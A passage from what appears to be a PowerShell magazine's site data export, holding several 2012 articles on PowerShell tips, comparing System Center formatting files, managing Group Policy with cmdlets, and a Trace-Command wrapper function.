object or the last object. That’s where the Get-Random cmdlet can help. Besides picking a random number, you can also use the Get-Random cmdlet to pick an object out of stream of objects:\nGet-Service | Get-Random Each time you run this, it is very likely that another service will be returned. But can we be sure that this will spread the selection of an object evenly over the available objects? Let’s use PowerShell to check.\n$count = @{} for($i = 0;$i -lt 1000;$i++){ $rnd = Get-Random -Minimum 1 -Maximum 10 $count[$rnd] += 1 } $count.GetEnumerator() | Sort-Object -Property Name | Out-Chart -Label Name -Values Value -Title \"Random distribution\" This code randomly picks a number between 1 and 10, and does this a thousand times. Each time a specific number is selected, the script will increment the corresponding value in the hash table. And since a picture says more than a thousand words, I used one of the PowerGadgets cmdlets to visualize the result.\nThe graph clearly shows that each of the numbers 1 to 10 was selected within a reasonable margin around the ideal number of a 100 selections. Good enough for me (and my scripts), I’ll pick my objects randomly from now on!\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/05/31/luc-dekens-favorite-powershell-tips-tricks/","tags":["Tips and Tricks"],"title":"Luc Dekens’ Favorite PowerShell Tips \u0026 Tricks"},{"categories":["News"],"contents":"The new book, ”PowerShell for Developers” written by our Editor and PowerShell MVP Doug Finke, is available in early release at a significant discount. If you’re serious about PowerShell, whether you’re a Developer or IT Pro, this is a must read.\nCatch up with Doug at his blog http://dougfinke.com/blog\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/05/31/powershell-for-developers/","tags":["News"],"title":"PowerShell for Developers"},{"categories":["Tips and Tricks"],"contents":"ScriptBlock Binding to Pipeline Bound Parameters I see many PowerShell snippets on Stack Overflow that look similar to one below:\nGet-ChildItem *.txt | Foreach { Rename-Item -Path $_ -NewName \"$($_.basename).bak\" } The use of the ForEach-Object cmdlet above is unnecessary because Rename-Item accepts pipeline input for both the Path and NewName parameters. You can see this in the following example.\nPS\u0026gt; $obj = New-Object PSObject –Property ` @{Path='C:\\Users\\Keith\\foo.txt';NewName='bar.txt'} PS\u0026gt; $obj | Rename-Item –WhatIf What if: Performing operation \"Rename File\" on Target \"Item: C:\\Users\\Keith\\foo.txt Destination: C:\\Users\\Keith\\bar.txt\". You may be thinking that while this may be an interesting academic exercise, how is it any better than the original version that uses ForEach-Object? Well, it is not better at this point but PowerShell has one more trick up its sleeve to help us achieve a more efficient expression of this rename operation. The trick is that PowerShell will accept a snippet of script called a script block for any parameter that is pipeline bound. You can see if a parameter is pipeline bound via Get-Help e.g.:\nPS\u0026gt; Get-Help Rename-Item ... -LiteralPath ... Accept pipeline input? true (ByPropertyName) -Path ... Accept pipeline input? true (ByValue, ByPropertyName) -NewName ... Position? 2 Accept pipeline input? true (ByPropertyName) This information tells us that the LiteralPath, Path, and NewName parameters accept pipeline input. The pipeline output of Get-ChildItem is bound to the LiteralPath parameter of the Rename-Item cmdlet. We can use the script block binding trick to specify the NewName. The updated version of this one-liner is shown below.\nPS\u0026gt; Get-ChildItem *.txt | Rename-Item -NewName {\"$($_.BaseName).bak\"} In this version the script block {“$($_.BaseName).bak”} is evaluated and used as the argument to the NewName parameter. Because the script block is used to produce an argument for a pipeline bound parameter, it is legal to reference pipeline input via the $_ variable.\nUsing PowerShell v3’s Out-GridView for Multiple-Selection This tip is pretty simple but occasionally very useful. The updated Out-GridView cmdlet in PowerShell v3 supports the PassThru parameter. In addition, Out-GridView supports multiple-selection of the items passed into as well as the ability to cancel an operation. This can be very handy for cases where, for example, you may want to select from a list of processes to stop.:\nPS\u0026gt; Get-Process devenv | Select Name,Id,MainWindowTitle | Out-GridView -PassThru | Stop-Process This command displays the Out-GridView dialog as shown below. I can see which instance of Visual Studio I want to kill based on the MainWindowTitle property. I can select one or more devenv processes. If I press OK then the processes I selected will be stopped. If I press the Cancel button on the Out-GridView dialog, the pipeline is stopped and no processes are stopped.\nUsing the PowerShell Community Extension’s Show-Tree Command to Explore Providers This tip requires the free PowerShell Community Extensions (PSCX) module. PSCX is a set of general purpose PowerShell commands. One of the commands it provides is Show-Tree which is very useful for exploring PowerShell drives like:\n WSMan:\\ Cert:\\ HKLM:\\ IIS:\\ (if you have imported the WebAdministration module)  Normally, if you want to explore a drive you would use Windows Explorer. Unfortunately Windows Explorer has no visibility into PowerShell drives except for those that are based on the file system. Equally unfortunate is that drives like WSMan: and IIS: hide a lot of functionality i.e. the contained functionality is not very discoverable. This is where the Show-Tree comes in very handy. It can display information in a PowerShell drive very much like dostree displays file system structure in a console. For example, here is sample output from running Show-Tree on the IIS:\\ drive:\nPS\u0026gt; Show-Tree IIS:\\ -Depth 3 IIS:\\ ├──AppPools │ ├──ASP.NET v4.0 │ │ └──WorkerProcesses │ ├──ASP.NET v4.0 Classic │ │ └──WorkerProcesses │ ├──Classic .NET AppPool │ │ └──WorkerProcesses │ └──DefaultAppPool │ └──WorkerProcesses ├──Sites │ └──Default Web Site │ ├──aspnet_client │ └──Blog └──SslBindings In general, PowerShell drives have items that can be either Container or Leaf items. What you see above are container items only. There can also be ItemProperties which are usually where the action is when it comes to changing settings on a PowerShell provider-based drive. For example, here is listing of item properties for the DefaultAppPool:\nPS\u0026gt; Show-Tree IIS:\\AppPools\\DefaultAppPool -ShowProperty IIS:\\AppPools\\DefaultAppPool ├──Property: applicationPoolSid = S-1-5-82-3006700770-424185619-1745488364-7... ├──Property: Attributes = Microsoft.IIs.PowerShell.Framework.ConfigurationAt... ├──Property: autoStart = True ├──Property: ChildElements = Microsoft.IIs.PowerShell.Framework.Configuratio... ├──Property: CLRConfigFile = ├──Property: cpu = Microsoft.IIs.PowerShell.Framework.ConfigurationElement ├──Property: ElementTagName = add ├──Property: enable32BitAppOnWin64 = False ├──Property: enableConfigurationOverride = True ├──Property: failure = Microsoft.IIs.PowerShell.Framework.ConfigurationElement ├──Property: ItemXPath = /system.applicationHost/applicationPools/add[@name=... ├──Property: managedPipelineMode = Integrated ├──Property: managedRuntimeLoader = webengine4.dll ├──Property: managedRuntimeVersion = v2.0 ├──Property: Methods = Microsoft.IIs.PowerShell.Framework.ConfigurationMetho... ├──Property: passAnonymousToken = True ├──Property: processModel = Microsoft.IIs.PowerShell.Framework.Configuration... ├──Property: queueLength = 1000 ├──Property: recycling = Microsoft.IIs.PowerShell.Framework.ConfigurationEle... ├──Property: Schema = Microsoft.IIs.PowerShell.Framework.ConfigurationElemen... ├──Property: startMode = OnDemand ├──Property: state = Started ├──Property: workerProcesses = Microsoft.IIs.PowerShell.Framework.Configurat... └──WorkerProcesses ... This view of the IIS:\\ drive reveals much more information such as which Managed PipelineMode is in use by the app pool as well as which version of the .NET runtime it uses. With this information it becomes much easier to figure how to change these settings:\nPS\u0026gt; Set-ItemProperty IIS:\\AppPools\\DefaultAppPool managedRuntimeVersion v4.0 Discovering these properties and their locations is more than half the battle to figuring out how to change their values.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/05/29/keith-hills-favorite-powershell-tips-tricks/","tags":["Tips and Tricks"],"title":"Keith Hill’s Favorite PowerShell Tips \u0026 Tricks"},{"categories":["News"],"contents":"The popular free eBook has been updated for PowerShell 2.0. You can read it online.\nYou need to be a PowerShell.com member in order to have access to the content. You can register for free here.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/05/21/master-powershell-with-dr-tobias-weltner/","tags":["News"],"title":"Master-PowerShell | With Dr. Tobias Weltner"},{"categories":["News"],"contents":"SAPIEN Technologies has announced the immediate availability of PrimalScript 2012, the premiere Scripting Integrated Development Environment, and PowerShell Studio 2012. PowerShell Studio, has all the features of its predecessor, PrimalForms, plus a raft of new features for 2012.\nCheck out Sapien’s blog for a series of blog posts describing what’s new and changed in these products.\nYou can download and try the new products. A free 45-day trial is available over at http://www.sapien.com/software\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/05/20/primalscript-2012-and-powershell-studio-2012/","tags":["News"],"title":"PrimalScript 2012 and PowerShell Studio 2012"},{"categories":["How To","System Center"],"contents":"On the 7th of May 2012 we released our first Update Rollup 1 (UR1) for System Center 2012. In addition to earlier released fixes for Virtual Machine Manager (VMM) and App Controller (AC), the update rollup now includes fixes for System Center Operations Manager (OM).\nAnd because I’m a Premier Field Engineer at Microsoft specialized in System Center Operations Manager I was curious to see if some of the suggestions I made in pre-RTM and Beta versions where part of this Update Rollup 1. Let’s go back some months when I was in Redmond for our semi-annual TechReady. TechReady is 5-day internal technical conference for Microsoft employees. During my time in Redmond for TechReady I was asked to work with James Brundage on some of the suggestions I made for the System Center Operations Manager cmdlets in the pre-RTM and Beta versions of the product. System Center Operations Manager 2012 is officially released during the Microsoft Management Summit in Las Vegas in April 2012.\nWhen looking at the Description of Update Rollup 1 for System Center 2012 I found the following:\nYes! There I found the formatting changes James and I worked on during my week at TechReady. But let’s explain first some basic information about PowerShell formatting. We start using our beloved Get-Help cmdlet.\nGet-Help about*format* will return Help information from the about_Format.ps1xml help file. It tells us that the Format.ps1xml files in Windows PowerShell define the default display of objects in the Windows PowerShell console. You can create your own Format.ps1xml files to change the display of objects or to define default displays for new object types that you create in Windows PowerShell.\nAnd that’s exactly what James did with the suggestions I made for some of the earlier formatting in the Beta releases of System Center Operations Manager 2012, changing the format.ps1xml files for System Center Operations Manager 2012. How do we know what has changed since the last RTM Release? Just compare the Release to Manufacturing (RTM) formatting files with the new UR1 formatting files.\nTo find the format.ps1xml files for the Operations Manager 2012 we need to look in the installation where the Operations Manager Console is installed. We can search the program installation folder recursively for the files with the format.ps1xml extension.\nPS\u0026gt; $path = \"D:\\Program Files\\System Center 2012\\Operations ` Manager\\Powershell\\OperationsManager\" PS\u0026gt; Get-ChildItem -Path $path -Recurse -Filter *.format.ps1xml  I’ve installed Operations Manager on my D: drive, default it’s installed on your C: drive.  Now we know which files we need to compare with the new installed *.format.ps1xml from the UR1. We can use the Compare-Object cmdlet to check which files have been changed.\n$PreUR1FilesPath = \u0026quot;D:\\Temp\\Powershell_preRU1\u0026quot; $PostUR1FilesPath = \u0026quot;D:\\Temp\\Powershell_postRU1\u0026quot; $filter = \u0026quot;*.format.ps1xml\u0026quot; $PreUR1FormatFiles = Get-ChildItem -Path $PreUR1FilesPath -Recurse -Filter $filter $PostUR1FormatFiles = Get-ChildItem -Path $PostUR1FilesPath -Recurse -Filter $filter $result=Compare-Object -ReferenceObject $PreUR1FormatFiles -DifferenceObject ` $PostUR1FormatFiles -Property Name, Length $result | Format-Table -AutoSize The only file that seems to be changed is the Microsoft.SystemCenter.OperationsManagerV10.format.ps1xml file.\nAnd again we are using the Compare-Object cmdlet to compare the content of the pre RU1 Microsoft.SystemCenter.OperationsManagerV10.format.ps1xml file with the post RU1 format file.\n$strReference = Get-Content \"D:\\Temp\\Powershell_preRU1\\OperationsManager\\ ` OM10.Commands\\Microsoft.SystemCenter.OperationsManagerV10.format.ps1xml\" $strDifference = Get-Content \"D:\\Temp\\Powershell_postRU1\\OperationsManager\\ ` OM10.Commands\\Microsoft.SystemCenter.OperationsManagerV10.format.ps1xml\" Compare-Object -ReferenceObject $strReference -DifferenceObject $strDifference We can see all the formatting that has been changed in RU1. To be honest there are better tools to compare the contents of two files, and I’ve use Notepad++ to look at one interesting formatting change 😉\nWe can see formatting for the Microsoft.EnterpriseManagement.Administration.NotificationRecipient TypeName did not existed before RU1 was installed. To find the cmdlet(s) which has the Microsoft.EnterpriseManagement.Administration.NotificationRecipient is easy using the Get-Command cmdlet.\nImport-Module OperationsManager Get-Module Get-Command -Module OperationsManager | Where-OBject {$_.OutputType -like ` \"Microsoft.EnterpriseManagement.Administration.NotificationRecipient\"} We can now run the Get-SCOMNotificationSubscriber cmdlet from the Operations Manager Shell to see the cool formatting improvements in RU1.\nThis is it for now about the formatting improvements in RU1 for System Center Operations Manager 2012. Maybe next time a blog post about how you can use the ** **EzOut module from Start-Automating for simplifying the process of making format XML files. You can use EZOut to change formatting and type information on the fly, or use it to help author files to use with your PowerShell modules.\nReferences:\n Update Rollup 1 for System Center 2012 – Operations Manager Detailed list of fixes can be found on Knowledge Base Article KB2686249 System Center Operations Manager Team blog Update to Update Rollup 1 for System Center 2012  ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/05/14/formatting-changes-for-system-center-operations-manager-2012-in-update-rollup-1/","tags":["System Center","How To"],"title":"Formatting changes for System Center Operations Manager 2012 in Update Rollup 1"},{"categories":["Group Policy"],"contents":"Overview In this article, I’ll talk about your options when it comes to managing Group Policy using PowerShell. To be sure, depending upon your needs, Group Policy is nearly a full citizen in the world of PowerShell-based management. I’ll talk about why I say, “nearly” a little later, but to review, you have the following options for managing GP with PowerShell today:\n Windows Server 2008 R2 and Windows 7 introduced the Group Policy PowerShell Module  25 cmdlets for managing Group Policy You can still access the “old” GPMC APIs through COM in PowerShell My free GPMC cmdlets (introduced originally in 2008) – www.sdmsoftware.com/freeware  Provides a friendly wrapper on the GPMC COM APIs for Windows XP/Server 2003 environments My free cmdlets for troubleshooting/reporting/managing other aspects of Group Policy with PowerShell http://www.sdmsoftware.com/freeware \u0026amp; http://www.gpoguy.com/Free-GPOGuy-Tools.aspx      Let’s start off by talking about the Group Policy Module that Microsoft shipped in Windows 7 \u0026amp; Windows Server 2008 R2.\nThe Group Policy PowerShell Module With the release of Windows 7 and Windows Server 2008 R2, Microsoft shipped the Group Policy Module—a set of 25 PowerShell cmdlets that it made available for GPO administrators to manage many of the same tasks that they would perform using GPMC. In fact, the GP PowerShell module is automatically installed when GPMC is installed as part of the Remote Server Administration Tools (RSAT) installation, as shown in Figure 1 below:\nOnce GPMC is installed, you can load up the Group Policy module simply by opening a PowerShell console session and typing:\nPS\u0026gt; Import-Module GroupPolicy To get a list of cmdlets available in the module, simply type:\nPS\u0026gt; Get-Command –Module GroupPolicy The Group Policy module covers the following tasks that you would typically perform within the GPMC GUI:\n Creating/Deleting/Renaming/Getting GPOs Backup/Restore/Copy/Import GPOs Creating/Getting Starter GPOs Getting/Setting GP Inheritance Getting/Setting GPO Permissions Creating/Deleting/Modifying GPO Links Get GPO Settings and RSoP Reports Getting/Setting/Deleting Administrative Template Settings Getting/Setting/Deleting GP Preferences Registry Policy  Of course, there are things you can’t ****do with the Group Policy module, such as:\n  Can’t get GPO links by SOM or GPO*\n  Can’t set WMI filters, except by GPO (and then only Gets are supported)\n  Can’t write Deny ACEs onto GPO permissions\n  Can’t write SOM delegation (e.g. Linking/RSOP/Planning permissions)*\n  Can’t read list of existing GPMC GPO Backups*\n  Can’t read/write GPOs setting outside of Administrative Templates or GP Preferences Registry Policy*\n  The items listed above with * are functions that you CAN do with a combination of SDM Software’s GPMC cmdlets (more on this later) or the commercial Group Policy Automation Engine.\nUsing the GP Module Despite the limitations in the Microsoft Group Policy, there is still quite a bit you can do with it. For example, the following PowerShell one-liner creates a new GPO, set an Administrative Template policy item, then changes delegation on the GPO to control who processes it, and finally links it to an OU:\n$key = HKLM\\Software\\Policies\\Microsoft\\Internet Explorer\\Restrictions' New-GPO 'IE No Help Policy' | Set-GPRegistryValue -Key $key ` -ValueName 'NoHelpMenu' -Type DWORD -Value 1 | Set-GPPermissions -Replace ` -PermissionLevel None -TargetName 'Authenticated Users' -TargetType group | ` Set-GPPermissions -PermissionLevel gpoapply -TargetName 'Marketing Users' ` -TargetType group | New-GPLink -Target 'OU=Marketing,DC=cpandl,DC=com' –Order 1 Let’s walk through what this one-liner is doing. The first cmdlet call is to New-GPO, where we create a GPO called “IE No Help Policy”. The next cmdlet, called Set-GPRegistryValue, is the one that sets an Administrative Template policy value within my newly created GPO. You’ll notice that the parameters on this cmdlet set the underlying registry value of the Admin. Template policy in question, rather than a “friendly” path as you would see in GP editor. This is by design. In order to use this cmdlet, you’ll need to know the underlying Registry key, value and value type for a particular Admin . Template policy before you can set it using this policy. In other words, the registry key and value I used above, HKLM\\Software\\Policies\\Microsoft\\Internet Explorer\\Restrictions \\NoHelpMenu corresponds to a path under Administrative Templates in GP Editor – specifically Computer Configuration\\Policies\\Administrative Templates\\Windows Components\\Internet Explorer\\Turn off displaying the Internet Explorer Help Menu and I had to determine that by looking at the underlying ADMX file to see which registry location set that policy.\nAfter we set the Registry policy item, we call Set-GPPermissions to remove the Authenticated Users ACE from the GPO’s security delegation. This is the default ACE that gets applied to a GPO that allows all users and computers to process that GPO. In our example above, we want this GPO to only be processed by members of the “Marketing Users” group. As a result, we pipe to the next Set-GPPermissions call to add the Marketing Users Group with the Apply Group Policy (gpoapply) permission to grant that access.\nFinally, we link the new GPO using New-GPLink to the Marketing OU within the cpandl.com domain, and we’re done! We now have a fully functional, fully permissioned, and linked GPO.\nGetting Around Get-GPO One of the most useful cmdlets in the Group Policy module is the Get-GPO cmdlet. This is the cmdlet you’ll use to get information about individual GPOs. You can also pass it the –All parameter to get back information on all GPOs within a given domain, as shown in Figure 2 below:\nAs you can see from Figure 2, Get-GPO returns a set of properties related to the GPO in question. These range from the GPO’s name, GUID (Id property), Description (comment) and GPO status, to its version information and whether it has any WMI filters linked to it. If you get a GPO and pipe that to Get-Member, you’ll also see a wide variety of methods available to this cmdlet, as shown in Figure 3 below:\nWhat’s interesting about this is that many of the methods shown in Figure 3 above are wrapped up in other cmdlets with the Group Policy Module. For example, the Backup method, which could be called directly here, is exposed via the Backup-GPO cmdlet. But there are some methods that are not exposed through cmdlets, such as IsAclConsistent() and MakeAclConsistent(), which actually check whether the given GPO’s ACLs are consistent between the AD and SYSVOL parts of the GPO and, if not, will fix it.\nIn addition, we can use this Get-GPO cmdlet to get information about WMI filters that are linked to a GPO. For example, I can view a WMI filter linked to a GPO as follows:\n(Get-GPO 'WMI Filter Test').WmiFilter The output of this, as an example, is shown here:\n(Get-GPO 'wmi filter test').WmiFilter | Format-List Description : This returns a True if the timezone is Pacific\nName: Timezone Path: MSFT_SomFilter.ID=\"{A1B22257-AF6E-4635-99B0-56AF0CC05E44}\",Domain=\"cpandl.com\" You can also get details about this WMI filter, such as the query it implements, by issuing the following modification to the command above:\n(Get-GPO 'wmi filter test').WmiFilter.GetQueryList() Which returns the following:\nroot\\CIMv2;Select * from Win32_SystemTimeZone Where DaylightName=\"Pacific Daylight Time\" Returning GPO Reports The last area I’ll focus on around the Group Policy module are some of the reporting capabilities that are provided—specifically the Get-GPOReport cmdlet for returning information about GPO settings and Get-GPResultantSetOfPolicy report for returning RSoP data against a given client.\nGet-GPOReport is designed to mimic the detail you get when you click on a GPO’s settings tab within GPMC. In fact, you can output the results of this cmdlet to either HTML or XML, where the HTML mimics precisely what you see within GPMC and the XML returns a stripped down representation of settings data, without the labels that identify the settings within GP Editor. Creating a GPO settings report is as simple as typing the following PowerShell command:\nGet-GPOReport 'Default Domain Policy' -ReportType html -Path c:\\data\\ddreport.html In this example, I’ve created an HTML file of the Default Domain Policy GPO and stored it in a file called c:\\data\\ddreport.html. If I left out the –Path parameter, the raw HTML would be sent to the pipeline. Similarly, if I set the -ReportType parameter to XML, and leave off the path file, I can get the raw XML sent to the pipeline.\nThis provides some interesting options for getting at this XML data using PowerShell’s type accelerator. For example, I can issue the following command:\n$report = Get-GPOReport 'Default Domain Policy' -ReportType xml Once you have the report in XML format, you can navigate the XML’s nodes using standard PowerShell properties, as shown here:\nYou’ll find the actual settings within the report under the Computer and User properties, organized by client side extension (e.g. in Figure 4 above where the Security and Registry extensions are shown under the ExtensionData property).\nSimilarly, you can get RSoP data for a given computer and user by calling the Get-GPResultantSetOfPolicy cmdlet as follows:\nGet-GPResultantSetOfPolicy -ReportType xml -Computer ‘win7-x86-1’ ` -User ‘cpandl\\darren’ -Path c:\\data\\rsop.xml In this command, I’m calling the cmdlet to get RSoP data from a computer called win7-x86-1 and a user account on that computer called “cpandl\\darren”. I store that data an XMLl file called c:\\data\\rsop.xml. Unlike the Get-GPOReport cmdlet, this RSoP cmdlet doesn’t allow you to leave out the –Path parameter and send the output to the pipeline, curiously. So if you want to load up your XML into a type-accelerated PowerShell variable like I did with Get-GPOReport, you’ll have to first save it to a file then load up that file into a variable as so:\n$rsop = Get-Content c:\\data\\rsop.xml Then you can navigate the XML nodes just as in my previous example.\nLiving Outside the GP Module There’s a lot of cool stuff you can do with the GP module, but there are also a fair number of limitations or things that it doesn’t do. To fill in the gaps, those of us at SDM Software and GPOGUY.COM have created a number of PowerShell-based GP utilities to help augment your toolkit, including:\n  At www.sdmsoftware.com/freeware:\n  GPMC Cmdlets 1.4: Provides 25 cmdlets for pre-Windows 7/Windows Server 2008 R2 environments. Also includes some things that the GP Module does not—the ability to view GP links by GPO or SOM\n  GP Refresh Cmdlet: Let’s you perform remote GP refreshes from PowerShell\n  GP Health Cmdlet: Let’s you get GP processing health (including overall status, how long GP processing took, which GPOs were processed, etc.) from PowerShell\n  At GPOGUY.COM (Under the Free Tools Library)\n  Get-SDMGPOVersion is like a PowerShell version of GPOTool—it checks AD \u0026amp; SYSVOL version number consistency across all GPOs\n  Invoke-SDMTouchGPO provides a way of “touching” the version number on a GPO, thereby forcing clients to think it’s changed and perform a refresh of Group Policy\n  Our GPMC Cmdlets precede the existence of the Microsoft Group Policy module and provide GPMC functionality to PowerShell for versions of Windows prior to Windows 7 (e.g. Windows XP and Server 2003). You can also still use them under Windows 7, but many of the features are redundant to the Windows 7 GP module. However, as I mentioned above, there are some things you can do with our GPMC cmdlets that aren’t exposed by the GP module, including, most notably, getting information about GPO links. As an example, the Get-SDMGPLink cmdlet lets you report on GPO links, but more importantly, you can query GPO links by either scope (e.g. OU or domain) or GPO. For example, if I want to discover all the GPOs linked to the marketing OU, I can issue the following:\nGet-SDMGPLink -Scope 'OU=Marketing,DC=cpandl,DC=com' And the cmdlet will report all the GPOs linked to the Marketing OU, as shown in Figure 5:\nYou can also view where a particular GPO is linked by issuing the following command:\nGet-SDMGPLink -Name 'Default Domain Policy' Group Policy Troubleshooting Next up is the Group Policy health cmdlet, another one of the free cmdlets available at www.sdmsoftware.com/freeware. The health cmdlet is designed to quickly return GP health and processing information against one or more remote systems. It returns a red or green status about overall GP processing health and provides a lot more detail about the GPOs that were processed by a computer and user, what CSEs were processed and whether they succeeded or failed and other details such as whether loopback was enabled on the system, how long GP processing took and more. Once installed the cmdlet syntax is pretty straightforward—you can pass in a single computer name or a whole OU worth of computers and cmdlet will query the systems and return results to the pipeline. In addition, if you use the OutputbyXML parameter, the results will be returned as an XML document, which you can then store and navigate using PowerShell’s XML node navigation capabilities. An example of the output of the Health cmdlet is shown here:\nCommercial Group Policy PowerShell Functionality In this final section, I’ll detail the capabilities that you can get for managing GP using commercial solutions developed by SDM Software. The first and most powerful of these is the Group Policy Automation Engine. The GPAE, first released in 2007, is the first and only product that provides the ability to automate read and writes to GPO settings, using PowerShell, of course. The GPAE supports about 80% of the existing policy areas, including Admin. Templates, Security policy, GP Preferences, Software Installation, Folder Redirection, and more. As a quick example, the following script lets you create new GP Preferences drive mapping policies based on input from a CSV file, complete with an item-level target that filters the drive mapping on a user group:\nfunction Map-Drive { param( [string]$DriveLetter, [string]$Share, [string]$Domain, [string]$GroupName ) Write-Host \u0026quot;Writing Drive Mapping: $DriveLetter\u0026quot; $gpo = Get-SDMGPObject \u0026quot;gpo://cpandl.com/Drive Mapping Policy\u0026quot; -OpenbyName $path ='User Configuration/Preferences/Windows Settings/Drive Maps' $drives = $gpo.GetObject($path) $map = $drives.Settings.AddNew($DriveLetter) $map.Put('Action',[GPOSDK.EAction]'Create') $map.Put('Drive Letter',$DriveLetter) $map.Put('Location',$Share) $map.put('Reconnect', $true) $map.Put('Label as', $DriveLetter) # now do ILT $objUser = New-Object System.Security.Principal.NTAccount $Domain, $GroupName $strSID = $objUser.Translate([System.Security.Principal.SecurityIdentifier]) $iilt = $GPO.CreateILTargetingList() $itm = $iilt.CreateIILTargeting([GPOSDK.Providers.ILTargetingType]'FilterGroup') $itm.put('Group',$groupName) $itm.put('UserInGroup',$true) $itm.put('SID',$strSID.Value) $iilt.Add($itm) # now add ILT to drive mapping and save the setting $map.Put('Item-level targeting',$iilt) $map.Save() } $driveInfo = Import-Csv -Path c:\\data\\drivemaps.csv foreach ($drive in $driveInfo) { Map-Drive -DriveLetter $drive.DriveLetter -Share $drive.Share ` -Domain $drive.Domain -GroupName $drive.GroupName } The GPAE can also read settings out of GPOs and then use that information as input to perform other changes (e.g. reading settings out of one GPO and writing them to another one).\nExporting and Comparing GPOs the PowerShell Way To round out the commercial offering that SDM Software provides, the GPO Reporting Pak are GUI offerings that provide powerful reporting and comparison for GPOs. The Reporting Pak, composed of GPO Compare and GPO Exporter also provide PowerShell interfaces, so you can do cool stuff like use PowerShell to compare the settings of a GPO in one domain with a GPO in another, as shown in Figure 7.\nSummary The bottom line is that regardless of whether you’re using the Microsoft Group Policy module, some of the free cmdlets available on SDM Software or GPOGUY.COM, or one of the commercial products listed here, there is now little that you can’t do with PowerShell and Group Policy!\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/05/14/managing-group-policy-with-powershell/","tags":["Group Policy"],"title":"Managing Group Policy with PowerShell"},{"categories":["How To"],"contents":"I guess when you use PowerShell; you very often don’t care how it works. As long as it does what you asked it to do – you are happy. Your job is done on time in consistent, repetitive manner, and you have time to spend with family and friends. But at times you may start to wonder, how it works? When you ask this question, neither –Verbose nor –Debug can answer. It’s either unexpected behaviour of cmdlet, or some magic that happens regardless what documentation clearly states. The part of you which likes riddles, and likes them solved, kicks in. And you begin to dig into the environment. And, of course – you can hire Google-fu, but at times it won’t get you far.\nWhen that happens, it’s the good moment to start PowerShell and take a closer look at two cmdlets: Get-TraceSource and Trace-Command.\nForm a question In order to get the right answer – you first need to be sure you asked the question right. That’s why Get-TraceSource is very important part of this puzzle. When you launch it without any parameters you will get the list of possible trace names. Each name is accompanied by description that can be helpful at times, but not always. This cmdlet itself lets you look for particular names using wildcards. Let’s say you want to look deeper into the way parameters are bound by commands. It would be as simple as:\nPS\u0026gt; Get-TraceSource -Name *param* One thing to keep in mind: some sources are loaded after command is used. For example, try to find any Native* sources before running any native command (like ping, ipconfig, etc):\nIf -Name is not enough then — as usually in PowerShell – resulting output of Get-TraceSource can be easily filtered. Just ask for trace source where description matches pattern you are after. And because not all names are very descriptive, or rather – some descriptions are more informative than just $_.Name.Split() – it should help you get to correct source names.\nOnce you find out what the possible trace name is (you can pick up few, Trace-Command accepts both arrays and wildcards) next step is to actually ask your question and see if this really gives you an answers or just generates several new questions instead.\nAsk your question When you got that far you are probably tempted to ask as general question as possible. But you should be careful – Trace-Command can be so verbose in its output, that it can kill your console at times. Also, specifying ‘*’ as the name of the trace will seldom be a good idea.\nThis is moment where two “gotchas” may stop you for a moment or two. First of all – PowerShell is very bad if you specify wrong source name. You won’t get error, warning, suggestion to check valid sources – instead you will get no trace messages at all. If you are confident those messages should show up, you will probably notice a typo eventually. If you are not so sure – you may assume that you just guessed wrong source and look for another ‘suspect’.\nNext thing is listener that will be target of you trace. If you want to actually see anything you have to either enable –PSHost switch, or select –FilePath. If you haven’t, nothing will show up. Once you got both right – you will get some output that may (or may not) give you clue on what is actually going on:\nIf the output is just too much to read on the screen – it’s worth considering use of –FilePath instead of –PSHost. And if you want to inject previously run command into –Expression, just use #[TAB] – it will get you there promptly.\nBut, honestly, do you really want to do all that? Copy and paste trace names ‘just in case’? Remember to include listener? And last but not least, inject code using some tricks each time instead of putting it in curly braces and just pass it to tracing command using pipe? Or maybe you do not care about command output now that you have seen it already?\nSo, why not build simple wrapper that would prevent us from doing all that?\nQuestions generator I’ve decided long ago to do exactly that: create simple wrapper around Trace-Command that would:\n validate ‘Name’ parameter using Get-TraceSource use either PSHost or FilePath (if it’s specified) sent output to $null if –Quiet option is selected pick up expression from pipeline, to support easy injection of previously run commands  I also decided that I’m fine with chopping off some other options that I hardly use (but it should not be hard to implement them later) like listener options. No more silence when you specify wrong name and no more silence when you forget to select listener. Also, pure traces without some commands output mixed here and there. So here you go, early beta of PowerShell Detective module. 😉\nfunction Trace-Expression { [CmdletBinding(DefaultParameterSetName = \u0026#39;Host\u0026#39;)] param ( # ScriptBlock that will be traced [Parameter( ValueFromPipeline = $true, Mandatory = $true, HelpMessage = \u0026#39;Expression to be traced\u0026#39; )] [ScriptBlock]$Expression, # Name of the Trace Source(s) to be traced [Parameter( Mandatory = $true, HelpMessage = \u0026#39;Name of trace, see Get-TraceSource for valid values\u0026#39; )] [ValidateScript({ Get-TraceSource -Name $_ -ErrorAction Stop })] [string[]]$Name, # Option to leave only trace information # without actual expression results. [switch]$Quiet, # Path to file. If specified - trace will be sent to file instead of host. [Parameter(ParameterSetName = \u0026#39;File\u0026#39;)] [ValidateScript({ Test-Path $_ -IsValid })] [string]$FilePath ) begin { if ($FilePath) { # assume we want to overwrite trace file $PSBoundParameters.Force = $true } else { $PSBoundParameters.PSHost = $true } if ($Quiet) { $Out = Get-Command Out-Null $PSBoundParameters.Remove(\u0026#39;Quiet\u0026#39;) | Out-Null } else { $Out = Get-Command Out-Default } } process { Trace-Command @PSBoundParameters | \u0026amp; $Out } } PS\u0026gt; New-Alias -Name tre -Value Trace-Expression PS\u0026gt; Export-ModuleMember -Function * -Alias * Answer found I like to know what is going on behind the scenes. That’s why I use Trace-Command quite often. It helped me very much in the past when I had problem with understanding how Foreach-Object works. What was the issue?\nWell, I had no idea why …\nPS\u0026gt; 1..5 | ForEach-Object { \u0026#39;begin\u0026#39; } { \u0026#34;process: $_\u0026#34; } { \u0026#39;end\u0026#39; } … works and why both –Begin and –End parameters are positional. PowerShell help will tell you that this is not the case. If you use Trace-Expression, you will soon find out that documentation is right, but is not precise in describing how cmdlet as a whole works. It misses very important piece: parameter –Process will take ValueFromRemainingArguments (same way $args does in functions without param block) and if there are more than one – it will try to distribute them 